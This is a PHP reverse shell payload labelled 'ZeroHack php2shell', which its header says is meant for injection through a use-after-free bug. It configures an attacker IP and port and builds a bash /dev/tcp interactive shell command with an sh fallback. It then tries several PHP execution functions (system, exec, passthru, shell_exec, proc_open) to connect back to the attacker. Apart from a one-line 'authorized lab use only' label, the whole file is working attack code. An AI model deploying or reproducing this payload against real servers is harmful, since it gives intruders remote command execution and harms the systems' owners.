<?php
/**
 * ZeroHack php2shell - Reverse Shell Payload
 * 
 * This payload is designed to be injected and executed via the UAF primitive.
 * It attempts to spawn a standard bash reverse shell back to the attacker.
 * 
 * ⚠️ AUTHORIZED LAB USE ONLY.
 */

// Set execution limits to ensure the shell stays alive
set_time_limit(0);
ignore_user_abort(true);

// CONFIGURATION - Update these before deployment if needed
$ip = '127.0.0.1';  // Attacker IP
$port = 4444;       // Attacker Port

// Validate connection parameters
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("[-] Invalid IP address provided.\n");
}
if (!is_numeric($port) || $port < 1 || $port > 65535) {
    die("[-] Invalid port provided.\n");
}

echo "[*] Attempting to connect to $ip:$port...\n";

// Execute the reverse shell
// Using bash -i for interactive TTY, redirecting stdout/stderr to the TCP socket
$cmd = "bash -c 'bash -i >& /dev/tcp/{$ip}/{$port} 0>&1'";

// Fallback to sh if bash is not available
$sh_cmd = "sh -c 'sh -i >& /dev/tcp/{$ip}/{$port} 0>&1'";

// Try to execute
if (function_exists('system')) {
    system($cmd);
} elseif (function_exists('exec')) {
    exec($cmd);
} elseif (function_exists('passthru')) {
    passthru($cmd);
} elseif (function_exists('shell_exec')) {
    echo shell_exec($cmd);
} else {
    // Fallback attempt using proc_open
    $descriptorspec = array(
       0 => array("pipe", "r"),
       1 => array("pipe", "w"),
       2 => array("pipe", "w")
    );
    $process = proc_open($sh_cmd, $descriptorspec, $pipes);
    if (is_resource($process)) {
        echo "[+] Shell executed.\n";
    } else {
        echo "[-] Failed to execute shell.\n";
    }
}
?>
